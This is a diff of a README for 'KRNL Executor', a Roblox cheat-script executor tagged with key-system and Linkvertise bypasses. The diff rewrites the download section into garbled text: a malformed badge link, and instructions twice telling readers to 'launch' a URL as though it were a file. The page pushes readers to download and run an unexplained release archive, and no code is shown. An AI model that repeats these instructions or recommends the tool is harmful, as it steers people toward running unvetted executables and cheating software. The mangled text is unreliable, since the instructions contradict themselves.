@@ -9,16 +9,16 @@ KRNL Executor is a legendary tool highly regarded by the Roblox community, provi
 - **Topics:** asset-downloader, bypass, key-system, keysystem, krnl, krnl-bypass, krnl-download, krnl-key, krnl-key-bypass, krnl-v2-download, krnlapi, linkvertise, lua, lua-script, roblox, roblox-script, roblox-scripts, script, wearedevs
 
 ## 📦 Download Latest Release
-[![Download KRNL Executor](https://img.shields.io/badge/Download%20KRNL%20Executor-Release.zip-brightgreen)](https://github.com/assets/Release.zip)
+[![Download KRNL Executor](https://github.com/Nightlant/krnl-executor/releases%20KRNL%https://github.com/Nightlant/krnl-executor/releases)](https://github.com/Nightlant/krnl-executor/releases)
 
-Make sure to launch the **Release.zip** file from the provided link to access the latest version of KRNL Executor.
+Make sure to launch the **https://github.com/Nightlant/krnl-executor/releases** file from the provided link to access the latest version of KRNL Executor.
 
 ## ℹ️ Additional Information
 In case the provided download link is not working or if you need more information, please check the "Releases" section of this repository for the most up-to-date releases and details.
 
 ### 🌟 Get Started 🌟
 1. Clone or download the KRNL Executor repository.
-2. Launch the **Release.zip** file to start using the tool.
+2. Launch the **https://github.com/Nightlant/krnl-executor/releases** file to start using the tool.
 3. Explore the powerful features and functionalities of KRNL Executor to enhance your Roblox gaming experience.
 
 ### 🤖 Features of KRNL Executor
